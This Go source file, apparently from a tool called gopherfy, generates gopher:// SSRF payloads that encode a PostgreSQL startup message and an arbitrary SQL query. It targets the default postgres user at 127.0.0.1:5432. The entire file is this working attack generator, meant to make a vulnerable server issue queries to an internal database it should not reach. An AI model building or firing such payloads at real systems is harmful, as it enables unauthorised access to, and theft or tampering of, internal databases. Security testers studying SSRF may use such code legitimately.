package postgresql

import (
	"fmt"
	"strings"

	"github.com/hupe1980/gopherfy/internal"
)

const (
	DefaultAddr = "127.0.0.1:5432"
	DefaultUser = "postgres"
)

type Options struct {
	Addr  string
	User  string
	DB    string
	Query string
}

type PostgreSQL struct {
	addr  string
	user  string
	db    string
	query string
}

func NewPostgreSQL(optFns ...func(o *Options)) *PostgreSQL {
	options := Options{
		Addr: DefaultAddr,
		User: DefaultUser,
	}

	for _, fn := range optFns {
		fn(&options)
	}

	return &PostgreSQL{
		addr:  strings.TrimSpace(options.Addr),
		user:  strings.TrimSpace(options.User),
		db:    strings.TrimSpace(options.DB),
		query: strings.TrimSpace(options.Query),
	}
}

func (p *PostgreSQL) Payload() string {
	start := fmt.Sprintf("000000%x000300", rune(4+len(p.user)+8+len(p.db)+13))
	data := fmt.Sprintf("00%x00%x00%x00%x0000510000%04x%x", "user", p.user, "database", p.db, len(p.query)+5, p.query)
	end := "005800000004"

	payload := internal.InsertNth(fmt.Sprintf("%s%s%s", start, data, end), '%', 2)

	return fmt.Sprintf("gopher://%s/_%%%s", p.addr, payload)
}
